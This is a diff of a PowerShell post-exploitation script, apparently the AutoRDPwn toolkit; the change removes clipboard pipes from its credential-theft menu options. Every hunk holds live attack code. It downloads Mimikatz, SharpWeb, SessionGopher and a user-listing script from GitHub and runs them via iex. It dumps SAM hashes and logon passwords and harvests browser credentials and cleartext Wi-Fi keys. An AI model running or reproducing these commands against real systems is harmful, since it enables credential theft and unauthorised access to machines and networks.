@@ -348,18 +348,18 @@ if($Language -in 'Spanish') {
         if($mimikatz -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
         Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
-        Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit" | clip
+        Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
         $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($mimikatz -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
         Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
-        Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit" | clip
+        Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit"
         $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($mimikatz -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500	; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SharpWeb.ps1" -UseBasicParsing | iex
-        .\SharpWeb.exe all | clip ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; del .\SharpWeb.exe ; sleep -milliseconds 2500 }
+        .\SharpWeb.exe all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; del .\SharpWeb.exe ; sleep -milliseconds 2500 }
 
         if($mimikatz -like '4') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500	; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	function Get-Wlan-Keys {[CmdletBinding()]Param ()
@@ -367,7 +367,7 @@ if($Language -in 'Spanish') {
         $exportdata = $wlans | Foreach-Object {$_.Replace("    $txt58     : ",$null)}
         $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}}
 	$wifikey = Get-Wlan-Keys ; if (!($wifikey -like "*Wi-Fi*")){ Write-Host ; Write-Host "$txt60" -ForegroundColor Red ; sleep -milliseconds 4000 } 
-	else { Write-Host ; $wifikey | clip ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause }}
+	else { Write-Host ; $wifikey ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause }}
 	
         if($mimikatz -like 'X'){ $input = 'x' ; continue }
         if($mimikatz -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}
@@ -436,11 +436,11 @@ if($Language -in 'Spanish') {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; sleep -milliseconds 2500 }
 
         if($forensics -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex | clip
+        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }
 	
 	if($forensics -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/SessionGopher.ps1 -UseBasicParsing | iex | clip
+        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/SessionGopher.ps1 -UseBasicParsing | iex
         Invoke-SessionGopher -Thorough ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($forensics -like 'X'){ $input = 'x' ; continue }
